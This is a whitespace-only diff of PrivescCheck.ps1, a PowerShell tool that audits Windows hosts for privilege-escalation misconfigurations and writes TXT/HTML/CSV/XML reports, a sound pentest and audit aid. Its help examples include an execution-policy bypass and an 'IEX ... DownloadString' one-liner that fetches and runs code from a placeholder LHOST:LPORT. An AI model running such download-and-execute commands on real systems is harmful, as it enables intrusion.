@@ -11,7 +11,7 @@ function Invoke-PrivescCheck {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
     This script aims to identify security misconfigurations that are relevant for privilege escalation. It also provides some additional information that may help penetration testers to choose between several potential exploits. For example, if you find that a service is vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know how often the machine is rebooted (in the case of a server). If you see that it is rebooted every night for instance, you may want to attempt an exploit.
 
@@ -32,15 +32,15 @@ function Invoke-PrivescCheck {
 
     .PARAMETER Format
     Select the format of the output file (e.g.: TXT, HTML, CSV or XML).
-    
-    .EXAMPLE
-    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck 
 
-    .EXAMPLE 
+    .EXAMPLE
+    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck
+
+    .EXAMPLE
     C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
     .EXAMPLE
-    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'; Invoke-PrivescCheck" 
+    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'; Invoke-PrivescCheck"
     #>
 
     [CmdletBinding()] Param(
@@ -64,7 +64,7 @@ function Invoke-PrivescCheck {
         $Format
     )
 
-    # Check wether the current process has admin privileges. 
+    # Check wether the current process has admin privileges.
     # The following check was taken from Pow*rUp.ps1
     $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
     if ($IsAdmin) {
@@ -80,7 +80,7 @@ function Invoke-PrivescCheck {
 "Id",                               "Command",                                      "Category",         "DisplayName",                          "Type", "Severity", "Format",   "Extended", "RunIfAdmin",   "Experimental", "Description"
 "USER_USER",                        "Invoke-UserCheck",                             "User",             "Identity",                             "Info", "Info",     "List",     "False",    "True",         "False",        "Get the full name of the current user (domain + username) along with the associated Security Identifier (SID)."
 "USER_GROUPS",                      "Invoke-UserGroupsCheck",                       "User",             "Groups",                               "Info", "Info",     "Table",    "False",    "True",         "False",        "List all the groups that are associated to the current user's token."
-"USER_RESTRICTED_SIDS",             "Invoke-UserRestrictedSidsCheck",               "User",             "Restricted SIDs",                      "Info", "Info",     "Table",    "True",     "True",         "False",        "List the restricted SIDs that are associated to the current user's token, if it is WRITE RESTRICTED." 
+"USER_RESTRICTED_SIDS",             "Invoke-UserRestrictedSidsCheck",               "User",             "Restricted SIDs",                      "Info", "Info",     "Table",    "True",     "True",         "False",        "List the restricted SIDs that are associated to the current user's token, if it is WRITE RESTRICTED."
 "USER_PRIVILEGES",                  "Invoke-UserPrivilegesCheck",                   "User",             "Privileges",                           "Info", "Info",     "Table",    "False",    "False",        "False",        "List the current user's privileges and identify the ones that can be leveraged for local privilege escalation."
 "USER_ENV",                         "Invoke-UserEnvCheck",                          "User",             "Environment Variables",                "Info", "Info",     "Table",    "False",    "True",         "False",        "List the environment variables of the current process and try to identify any potentially sensitive information such as passwords or API secrets. This check is simply based on keyword matching and might not be entirely reliable."
 "SERVICE_INSTALLED",                "Invoke-InstalledServicesCheck",                "Services",         "Non-default Services",                 "Info", "Info",     "List",     "False",    "True",         "False",        "List all registered services and filter out the ones that are built into Windows. It does so by parsing the target executable's metadata."
@@ -182,7 +182,7 @@ function Invoke-PrivescCheck {
         $CheckResult = Invoke-Check -Check $Check
 
         if (-not $Silent) {
-            # If the 'Silent' option was not specified, print a banner that shows some information about the 
+            # If the 'Silent' option was not specified, print a banner that shows some information about the
             # current check. Then, run the check and print the output either as a table or a list, depending on
             # the 'Format' value in the CSV data.
             Write-CheckResult -CheckResult $CheckResult
@@ -192,7 +192,7 @@ function Invoke-PrivescCheck {
             # and show the name of the check which is being run. Note: if we are not running in a console window
             # Write-Progress will fail, so use Write-Host to print the completion percentage instead.
             $Completion = [UInt32](($CheckCounter * 100) / ($AllChecks.Count))
-            
+
             if (Test-IsRunningInConsole) {
                 Write-Progress -Activity "$($Check.Category.ToUpper()) > $($Check.DisplayName)" -Status "Progress: $($Completion)%" -PercentComplete $Completion
             }
@@ -202,12 +202,12 @@ function Invoke-PrivescCheck {
         }
     }
 
-    # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'. Therefore, 
+    # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'. Therefore,
     # this will be only visible if run from a 'real' terminal.
     Write-PrivescCheckAsciiReport
 
-    # If the 'Report' option was specified, write a report to a file using the value of this parameter 
-    # as the basename (or path + basename). The extension is then determined based on the chosen 
+    # If the 'Report' option was specified, write a report to a file using the value of this parameter
+    # as the basename (or path + basename). The extension is then determined based on the chosen
     # format(s).
     if ($Report) {
 
@@ -218,7 +218,7 @@ function Invoke-PrivescCheck {
 
         $Format | ForEach-Object {
             # For each format, build the name of the output report file as BASENAME + . + EXT. Then generate the
-            # report corresponding to the current format and write it to a file using the previously formatted 
+            # report corresponding to the current format and write it to a file using the previously formatted
             # filename.
             $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
             if ($_ -eq "TXT") {
@@ -239,7 +239,7 @@ function Invoke-PrivescCheck {
         }
     }
 
-    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' parameter 
+    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' parameter
     # was specified.
     if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
 
@@ -341,7 +341,7 @@ function Write-CheckResult {
     )
 
     if ($CheckResult.ResultRaw) {
-            
+
         "[*] Found $(([Object[]]$CheckResult.ResultRaw).Length) result(s)."
 
         if ($CheckResult.Format -eq "Table") {
@@ -350,7 +350,7 @@ function Write-CheckResult {
         elseif ($CheckResult.Format -eq "List") {
             $CheckResult.ResultRaw | Format-List
         }
-        
+
     }
     else {
 
@@ -388,7 +388,7 @@ function Write-CsvReport {
         [Object[]]
         $AllResults
     )
-    
+
     $AllResults | Sort-Object -Property "Category" | Select-Object -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
 }
 
@@ -396,7 +396,7 @@ function Write-XmlReport {
     <#
     .NOTES
     According to the XML specification, some characters are invalid. The raw result of a check ("ResultRawString") may contain such characters. Therefore, this result must be sanitized before calling "ConvertTo-Xml". The method used here was taken from a solution that was posted on StackOverflow.
-    
+
     .LINK
     https://github.com/itm4n/PrivescCheck/issues/24
     https://stackoverflow.com/questions/45706565/how-to-remove-special-bad-characters-from-xml-using-powershell
@@ -446,8 +446,8 @@ for (var i=0; i<cells.length; i++) {
     } else if (cells[i].innerHTML == "N/A") {
         cells[i].innerHTML = "<span class=\"label other\">N/A</span>"
     }
-    
-    // If a cell is too large, we need to make it scrollable. But 'td' elements are not 
+
+    // If a cell is too large, we need to make it scrollable. But 'td' elements are not
     // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
     // it scrollabale.
     if (cells[i].offsetHeight > 200) {
@@ -462,7 +462,7 @@ body {
     font:1.2em normal Arial,sans-serif;
     color:#34495E;
     }
-      
+
 h1 {
     text-align:center;
     text-transform:uppercase;
@@ -470,13 +470,13 @@ h1 {
     font-size:2.5em;
     margin:20px 0;
 }
-      
+
 table {
     border-collapse:collapse;
     width:100%;
     border:2px solid #6699ff;
 }
-      
+
 th {
     color:white;
     background:#6699ff;
@@ -502,11 +502,11 @@ tbody td:nth-child(6) {
     font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
     text-align:left;
 }
-      
+
 tbody tr:nth-child(even) {
     background:#ECF0F1;
 }
-      
+
 tbody tr:hover {
     background:#BDC3C7;
     color:#FFFFFF;
@@ -548,7 +548,7 @@ $($JavaScript)
 </html>
 "@
 
-    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment  
+    $TableHtml = $AllResults | Sort-Object -Property "Category" | ConvertTo-Html -Property "Category","DisplayName","Description","Compliance","Severity","ResultRawString" -Fragment
     $Html = $Html.Replace("BODY_TO_REPLACE", $TableHtml)
     $Html
 }
@@ -561,11 +561,11 @@ function Write-PrivescCheckAsciiReport {
 
     Author: @itm4n
     License: BSD 3-Clause
-    
+
     .DESCRIPTION
 
     Once all the checks were executed, this function writes a table in ASCII-art that summarizes the results with fancy colors. As a pentester or a system administrator, this should help you quickly spot weaknesses on the local machine.
-    
+
     .EXAMPLE
 
     PS C:\> Write-PrivescCheckAsciiReport
@@ -649,12 +649,12 @@ function Write-PrivescCheckAsciiReport {
         $Padding = ' ' * $(63 - $Message.Length)
 
         Write-Host -NoNewline " $($_.Category.ToUpper()) > $($_.DisplayName)"
-        
+
         if ($_.ResultRaw) {
             Write-Host -NoNewLine " ->"
             Write-Host -NoNewLine -ForegroundColor $SeverityColor " $(([Object[]]$_.ResultRaw).Length) result(s)"
         }
-        
+
         Write-Host "$($Padding) |"
     }
 
